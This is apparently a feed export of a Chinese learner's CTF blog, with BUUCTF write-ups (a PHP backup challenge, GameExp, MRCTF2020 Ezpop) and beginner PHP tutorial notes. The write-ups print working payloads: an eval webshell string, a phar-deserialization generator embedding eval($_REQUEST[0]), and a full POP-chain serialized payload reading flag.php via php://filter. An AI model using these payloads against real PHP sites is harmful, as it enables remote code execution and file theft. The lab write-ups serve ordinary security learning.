class="line">            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</span><br><span class="line">            $password&#x3D;$this-&gt;random_code();</span><br><span class="line">            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));</span><br><span class="line">            $r[&#39;password&#39;]&#x3D;$password;</span><br><span class="line">            echo json_encode($r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 先验证保证为备份文件后,再保存为私藏文件 *&#x2F;</span><br><span class="line">    private function _write($dest, $content)&#123;</span><br><span class="line">        $f1&#x3D;$dest;</span><br><span class="line">        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);</span><br><span class="line">        fwrite($stream_f1, $content);</span><br><span class="line">        rewind($stream_f1);</span><br><span class="line">        $f1_read&#x3D;fread($stream_f1, 3000);</span><br><span class="line"></span><br><span class="line">        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);</span><br><span class="line"></span><br><span class="line">        if(!empty($matches[0]))&#123;</span><br><span class="line">            copy($f1,$f2);</span><br><span class="line">            fclose($stream_f1);   </span><br><span class="line">            return $f2;     </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);</span><br><span class="line">            fclose($stream_f1);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function _create($password, $content)&#123;</span><br><span class="line">        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;</span><br><span class="line">        return $_content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;</span><br><span class="line">        if(empty($chars))&#123;</span><br><span class="line">            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $count &#x3D; strlen($chars) - 1;</span><br><span class="line">        $code &#x3D; &#39;&#39;;</span><br><span class="line">        while( strlen($code) &lt; $length)&#123;</span><br><span class="line">            $code .&#x3D; substr($chars,rand(0,$count),1);</span><br><span class="line">        &#125;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序首先将<code>$filename</code>拼接到<code>profile/</code>，然后检测文件是否存在，若存在，将文件内容读出来进行html编码，然后生成一个随机的字符串作为读取文件内容的密码，</p><p>之后调用<code>_create()</code>函数，将密码和html编码后的文件内容，拼接到<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>里，</p><p>之后调用<code>_write()</code>函数，将上面这段php代码写进<code>private</code>目录，然后对文件内容内容进行正则表达式的检测，若通过检测,将文件内容写进<code>$dest</code>，并复制一份到<code>$f2</code>，若没有通过检测，则在<code>$dest</code>中写入<code>&lt;?php exit(); ?&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过back生成php文件</span><br></pre></td></tr></table></figure><p>上传txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;eval($_GET[0])&#125;</span><br></pre></td></tr></table></figure><p>进行备份，生成php文件</p><p><img src="/2021/09/04/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p><p>执行参数0</p><p><img src="/2021/09/04/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p><h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>这题也是坑了很久啊</p><p>首先是为了在目录下生成phar文件</p><p>需要修改配置php.ini，找了好久才解决：</p><p><a href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p><p>创建createphar.php文件（这以后可以用作phar文件解题模板）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $output = <span class="string">&#x27;eval($_REQUEST[0]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif⽂件头</span></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将⾃定义meta-data存⼊manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的⽂件</span></span><br><span class="line"><span class="comment">//签名⾃动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在有php.exe的目录下，执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  createphar.php</span><br></pre></td></tr></table></figure><p>这时候目录下就会生成php.phar,然后重命名为php.gif</p><p>然后在register页面注册时上传该文件</p><p>注册名随意，这里我用lex</p><p><img src="/2021/09/04/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p><p>还可以验证一下是否上传成功</p><p><img src="/2021/09/04/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p><p>接着重新注册一次，并且要用抓包修改，用户名注意要用刚刚注册的，</p><p>来触发反序列化,在post增添命令</p><p><img src="/2021/09/04/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Novel&quot;&gt;&lt;a href=&quot;#Novel&quot; class=&quot;headerlink&quot; title=&quot;Novel:&quot;&gt;&lt;/a&gt;Novel:&lt;/h4&gt;&lt;p&gt;参考博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/W4nder/p/1</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <link href="http://daweitech.github.io/2021/09/03/buu/19/"/>
    <id>http://daweitech.github.io/2021/09/03/buu/19/</id>
    <published>2021-09-03T07:48:25.000Z</published>
    <updated>2021-09-07T12:35:08.633Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p>借鉴博客</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>这题主要是代码审计，还涉及到一个知识点：构造pop链</p><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来分而解析几个不同的类</p><p>1.Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variable，变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个我在把文件放进seay审计系统里跑的时候就跑出了</p><p>include文件包含漏洞，而者也是我们最后要达成的目的：</p><p>利用文件包含漏洞和php伪协议来读取flag文件</p><p>这里还有魔法方法<strong>__invoke</strong> ，当脚本尝试将对象调用为函数时触发，所以在脚本中要把Modifier类调用为函数。</p><p>2.Show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到了这里的_wakeup()函数，在反序列化时一定会首先调用其函数，过滤了不老少关键字，但是像filter://伪协议却没有过滤。</p><p>而_toString把类当作字符串时触发</p><p>所以得出wakeup方法可以触发tostring方法</p><p>3.Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有魔法方法：<strong>__get</strong> 从不可访问的属性中读取数据会触发<br>会返回function作为函数调用。</p><p>思路得出：</p><p>​        首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p><h4 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h4><p>通过这题好好再恶补一次我的代码审计</p><h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>摘抄于一篇文章：<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p><p>php中$this-&gt;的用法简单介绍</p><p>php中我们一般是先声明一个类，然后用这个类去实例化对象</p><p>$this的含义是表示实例化后的具体对象</p><p>$this-&gt;表示在类本身内部使用本类的属性或者方法</p><p>‘ -&gt; ’ 符号是插入式解引用操作符。</p><p>换句话说，它是有调用由引用传递参数的子程序的方法</p><p>例子：</p><p>比如我们声明一个User类，它只含有一个属性 $name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>现在，我们给User类加个方法，就用getName()方法，输出$name的值吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如何使用呢？</span></span><br><span class="line">$user1 = <span class="keyword">new</span> User();</span><br><span class="line">$user1-&gt;name = <span class="string">&#x27;张三&#x27;</span>;</span><br><span class="line">$user1-&gt;getName();        <span class="comment">//这里就会输出张三！</span></span><br><span class="line">$user2 = <span class="keyword">new</span> User();</span><br><span class="line">$user2-&gt;name = <span class="string">&#x27;李四&#x27;</span>;  </span><br><span class="line">$user2-&gt;getName();       <span class="comment">//这里会输出李四！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我也上在线工具试了下</p><p><img src="/2021/09/03/buu/19/image-20210905155102186.png" alt="image-20210905155102186"></p><h5 id="2-PHP中的魔术方法"><a href="#2-PHP中的魔术方法" class="headerlink" title="2.PHP中的魔术方法"></a>2.PHP中的魔术方法</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__sleep() &#x2F;&#x2F;使用serialize时触发</span><br><span class="line">__destruct() &#x2F;&#x2F;对象被销毁时触发</span><br><span class="line">__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</span><br><span class="line">__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() &#x2F;&#x2F;把类当作字符串使用时触发</span><br><span class="line">__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h5 id="3-进一步理解本题代码"><a href="#3-进一步理解本题代码" class="headerlink" title="3.进一步理解本题代码"></a>3.进一步理解本题代码</h5><p>_invoke()函数：对象本身是不能够当作函数使用的，一旦被当作函数使用，，就会回调执行 _invoke()方法</p><p>_construct()函数：构造函数/方法</p><p>构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(参数列表)&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_get()函数： 访问不存在的成员变量时触发</p><p>作者这段话今天看懂了点</p><p><img src="/2021/09/03/buu/19/image-20210905161234966.png" alt="image-20210905161234966"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00解题&quot;&gt;&lt;a href=&quot;#0x00解题&quot; class=&quot;headerlink&quot; title=&quot;0x00解题&quot;&gt;&lt;/a&gt;0x00解题&lt;/h4&gt;&lt;p&gt;借鉴博客&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_4395</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(一)</title>
    <link href="http://daweitech.github.io/2021/09/03/php/1/"/>
    <id>http://daweitech.github.io/2021/09/03/php/1/</id>
    <published>2021-09-03T02:51:22.000Z</published>
    <updated>2021-09-04T07:31:12.242Z</updated>
    
    <content type="html"><![CDATA[<p> 从创建示例Web应用开始：Bob的汽车零部件商店</p><p>创建订单表单：</p><p>任何服务器端脚本语言最常见的应用场景是之一</p><p>1.1</p><p>就是处理HTML表单。</p><p>接下来程序清单1-1：order.html，商店基础HTML代码</p><p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p><p>呈现画面</p><form action="processorder.php" method="post"><table style="border: 0px;"><tr style="background: #cccccc;">    <td style="width: 150px; text-align: center;">Item</td>    <td style="width: 15px; text-align: center;">Quantity</td></tr><tr>    <td>Tries</td>    <td><input type="text" name="tireqty" size="3" maxlength="3"></td></tr><tr>    <td>Oil</td>    <td><input type="text" name="oilqty" size="3" maxlength="3"></td></tr><tr>    <td>Spark Plugs</td>    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td></tr><tr>    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>    </tr>    </table>    </form><p>注意：该表单的action属性被设置为能够处理客户订单的PHP脚本名称，后续会对该脚本进行增添。</p><p>一般地，actions属性就是用户点击提交按钮时将要载入的URL</p><p>用户在表单中输入的数据将按照method属性中指定的HTTP方法发送到这个URL，该方法是get（附加在URL的结尾）或者post（以单独的信息发送）。</p><p>1.2</p><p>表单的处理，需要创建在form标记的action属性中指定的处理脚本，该脚本为processorder.php，代码如下</p><p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p><p>我们在h2处添加了php代码</p><p>这样我们看到php的echo输出语句同时，</p><p>在html页面点击Submit Order也会有类似内容显示</p><p><img src="/2021/09/03/php/1/image-20210903150404934.png" 